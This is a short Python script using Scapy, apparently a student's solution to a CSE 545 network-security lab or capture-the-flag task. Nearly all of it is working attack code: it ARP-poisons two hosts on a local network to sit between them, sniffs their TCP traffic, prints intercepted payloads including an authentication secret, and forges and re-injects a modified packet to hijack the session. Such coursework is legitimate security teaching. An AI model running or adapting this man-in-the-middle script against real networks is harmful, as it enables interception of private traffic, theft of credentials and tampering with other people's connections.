""" Jeremy Escobar, CSE 545, Spring 2024 """

from scapy.all import *
import time

src_ip = "10.0.0.4"
dst_ip = "10.0.0.3"
dst_port = 31337
src_port = 39470

def arp_poison():
    # Create ARP packets to poison ARP cache
    arp_packet_1 = Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at", hwsrc=get_if_hwaddr("eth0"), psrc="10.0.0.3")
    arp_packet_2 = Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at", hwsrc=get_if_hwaddr("eth0"), psrc="10.0.0.4")

    # Send ARP packets to poison ARP cache
    sendp(arp_packet_1, iface="eth0", verbose=False)
    sendp(arp_packet_2, iface="eth0", verbose=False)
    print("ARP poisoning begins now...")

def packet_callback(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        payload_data = bytes(packet[TCP].payload)
        payload_length = len(payload_data)

        print(f"Packet received: {packet.summary()}")
        print(f"Payload data: {payload_data}")

        if payload_length == 65:
            print(payload_data) # secret is already authentication 
            packet[TCP].seq+=65 # adding 65 bits 
            packet[Raw].load = b"FLAG\n" # updating payload to include flag
            del packet[IP].len # cleaning up deleting/ previous packet needs to be flushed/ to properly authenticate. 
            del packet[IP].chksum   
            del packet[TCP].chksum
            sendp(packet, iface="eth0")  
            print("Packet sent")

# Call ARP poisoning function
arp_poison()
print("Start sniffing now...")
# Sniff packets and call packet_callback for each packet
sniff(iface="eth0", prn=packet_callback, count=40)
